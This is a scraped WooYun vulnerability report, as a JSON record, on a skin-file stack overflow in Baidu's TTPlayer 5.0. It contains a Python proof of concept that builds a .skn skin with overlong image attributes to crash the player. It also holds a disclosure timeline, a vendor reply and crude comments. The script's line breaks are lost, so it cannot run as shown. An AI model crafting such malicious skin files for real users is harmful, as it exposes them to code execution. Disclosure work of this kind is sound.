{"id": 7983, "wybug_id": "wooyun-2013-035573", "wybug_title": "百度音乐本地版（TTPlayer5.0）存在所处堆栈溢出可执行任意代码", "wybug_corp": "百度", "wybug_author": "路人甲", "wybug_date": "2013-08-30 12:07", "wybug_open_date": "2013-11-28 12:08", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "客户端安全", "缓冲区溢出", "栈溢出"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-10-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-28：\t细节向公众公开  简要描述： 皮肤文件处理逻辑中多处缺少长度检查存在堆栈溢出 详细说明：  \n\n   漏洞证明：  \n#!/usr/bin/pythonimport sys, time, os,zipfileimagefuzzer=\"A\"*4096imagefuzzer1=\"A\"skinxmltmp=\"<skin version=\\\"2\\\" name=\\\"fuck\\\" author=\\\"fucker\\\" url=\\\"http://fucker.com\\\" email=\\\"fucker@fucker.com\\\" transparent_color=\\\"#ff00ff\\\">\\\t<player_window image=\\\"\" + imagefuzzer1*512 + \"\"\" \">\t\t<play position=\"8, 125, 38, 155\" image=\" \"\"\" + imagefuzzer +\"\"\"\" />\t\t<pause position=\"8, 125, 38, 155\" image=\" \"\"\"+imagefuzzer1+\"\"\"\" />\t\t<stop position=\"43, 130, 63, 150\" image=\" \"\"\"+imagefuzzer1+\"\"\"\" />\t\t<prev position=\"70, 130, 90, 150\" image=\"\"\"+imagefuzzer1+\"\"\"\" />\t\t<next position=\"95, 130, 115, 150\" image=\"\"\"+imagefuzzer1+\"\"\"\" />\t\t<mute position=\"122, 130, 142, 150\" image=\"\"\"+imagefuzzer1+\"\"\"\" />\t\t<open position=\"130, 3, 149, 22\" image=\"\"\"+imagefuzzer1+\"\"\"\" />\t\t<lyric position=\"158, 3, 177, 22\" image=\"lyric.bmp\" />\t\t<equalizer position=\"180, 3, 199, 22\" image=\"equalizer.bmp\" />\t\t<playlist position=\"202, 3, 221, 22\" image=\"playlist.bmp\" />\t\t<minimize position=\"229, 6, 244, 21\" image=\"minimize.bmp\" />\t\t<exit position=\"245, 6, 260, 21\" image=\"exit.bmp\" />\t\t<progress position=\"18, 106, 248, 117\" bar_image=\"\" thumb_image=\"progress_thumb.bmp\" />\t\t<volume position=\"151, 130, 217, 148\" vertical=\"false\" bar_image=\"\" thumb_image=\"volume_thumb.bmp\" fill_image=\"volume_fill.bmp\" />\t\t<visual position=\"11, 30, 147, 78\" />\t\t<icon position=\"8, 86, 24, 102\" />\t\t<info position=\"28, 88, 258, 100\" color=\"#ffff06\" bkgnd=\"#000000\" font=\"SimSun\" font_size=\"12\" />\t\t<led position=\"204, 32, 254, 45\" image=\"number.bmp\" align=\"right\" />\t\t<stereo position=\"210, 50, 254, 62\" color=\"#00ffff\" bkgnd=\"#212741\" font=\"SimSun\" font_size=\"12\" align=\"right\" />\t\t<status position=\"181, 65, 254, 77\" color=\"#dcdcdc\" bkgnd=\"#212741\" font=\"SimSun\" font_size=\"12\" align=\"right\" />\t</player_window>\t<lyric_window position=\"268, 0, 536, 165\" resize_rect=\"14, 34, 256, 42\" resize_tile=\"1\" image=\"lyric_skin.bmp\">\t\t<title position=\"0, 8, 55, 21\" image=\"lyric_title.bmp\" align=\"center\" />\t\t<close position=\"245, 6, 260, 21\" image=\"exit.bmp\" align=\"right\" />\t\t<lyric position=\"8, 28, 260, 52\" />\t</lyric_window>\t<equalizer_window position=\"268, 165, 536, 330\" image=\"equalizer_skin.bmp\" eq_interval=\"2\">\t\t<close position=\"245, 6, 260, 21\" image=\"exit.bmp\" align=\"right\" />\t\t<enabled position=\"12, 33, 31, 52\" image=\"eq_enabled.bmp\" />\t\t<profile position=\"34, 33, 53, 52\" image=\"eq_profile.bmp\" />\t\t<reset position=\"56, 33, 75, 52\" image=\"eq_reset.bmp\" />\t\t<balance position=\"111, 39, 162, 48\" thumb_image=\"eq_balance.bmp\" bar_image=\"\" />\t\t<surround position=\"203, 39, 254, 48\" thumb_image=\"eq_balance.bmp\" bar_image=\"\" />\t\t<preamp position=\"13, 74, 31, 154\" thumb_image=\"eq_thumb.bmp\" bar_image=\"\" fill_image=\"eq_fill.bmp\" />\t\t<eqfactor position=\"59, 74, 77, 154\" thumb_image=\"eq_thumb.bmp\" bar_image=\"\" fill_image=\"eq_fill.bmp\" />\t</equalizer_window>\t<playlist_window position=\"0, 165, 268, 330\" resize_rect=\"14, 54, 254, 76\" resize_tile=\"1\" image=\"playlist_skin.bmp\">\t\t<title position=\"0, 8, 55, 21\" image=\"playlist_title.bmp\" align=\"center\" />\t\t<close position=\"245, 6, 260, 21\" image=\"exit.bmp\" align=\"right\" />\t\t<toolbar position=\"8, 24, 260, 44\" image=\"playlist_toolbar.bmp\" align=\"top+left\"/>\t\t<scrollbar buttons_image=\"scrollbar_button.bmp\" thumb_image=\"scrollbar_thumb.bmp\" bar_image=\"scrollbar_bar.bmp\" thumb_resize_center=\"8\" thumb_resize_tile=\"1\"/>\t\t<playlist position=\"9, 50, 259, 82\"/>\t</playlist_window></skin>\"\"\"buff = skinxmltmpgeneratefile = open(\".\\\\Classic\\\\skin.xml\", 'w')generatefile.write(buff)generatefile.close()zf=zipfile.ZipFile('Z:\\\\Classic.skn','w',zipfile.ZIP_DEFLATED)targetdir=\".\\\\Classic\"print os.chdir(targetdir)for dp,dn,fn in os.walk(\".\"):\tfor f in fn:\t\tprint os.path.join(dp,f)\t\tzf.write(os.path.join(dp,f))\tzf.close()\n   修复方案：  检查缓冲区长度   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-09-01 10:10 厂商回复： 感谢提交，正在处理。“百度，因你更安全”。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-30 13:25 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  求忽略    \n     2013-09-01 13:59 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  傻逼百度    \n     2013-09-01 16:24 |    \t\tValo洛洛 \t\t\t( 普通白帽子  |\t\t\t        Rank:458 漏洞数:52        | 。)\t\t \n  @xsser 大哥哥生气了    \n     2013-09-01 18:34 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  ...弱爆了,都是新手吗??不会安全曲奇??    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}